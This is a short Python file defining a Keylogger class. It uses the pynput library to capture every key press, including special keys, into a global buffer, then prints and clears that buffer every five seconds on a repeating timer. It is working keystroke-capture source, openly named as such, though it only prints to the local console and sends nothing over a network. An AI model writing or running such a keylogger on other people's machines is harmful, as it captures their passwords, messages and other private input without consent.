import pynput.keyboard
import threading

log = ''


class Keylogger:

    def process_kay_press(self, key):
        global log
        try:
            log += str(key.char)
        except AttributeError:
            if key == key.space:
                log += ' '
            else:
                log += f' {key} '

    def report(self):
        global log
        print(log)
        log = ''
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_kay_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
